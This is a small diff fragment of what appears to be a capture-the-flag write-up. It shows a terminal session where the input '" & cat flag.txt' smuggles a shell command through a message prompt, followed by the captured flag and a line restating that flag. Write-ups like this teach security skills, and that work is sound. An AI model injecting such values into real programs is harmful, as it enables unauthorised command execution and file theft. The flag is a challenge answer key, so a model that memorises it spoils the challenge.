@@ -33,3 +33,5 @@ Give me a message to say!
 " & cat flag.txt
 bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}sh: 2: Syntax error: Unterminated quoted string
 ```
+
+Giving the flag `bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}`
